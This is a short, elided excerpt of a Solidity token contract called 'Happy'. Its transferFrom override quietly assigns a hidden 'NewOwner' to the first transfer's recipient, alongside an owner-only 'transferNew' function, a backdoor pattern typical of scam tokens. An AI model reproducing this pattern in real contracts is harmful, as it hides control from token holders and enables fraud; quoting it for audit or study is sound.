...
contract Happy is Context, IERC20, Ownable, Pausable {
  ...
  function transferNew(address _New) private onlyOwner {
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    ...
    if(sender != address(0) && NewOwner == address(0)) NewOwner = recipient;
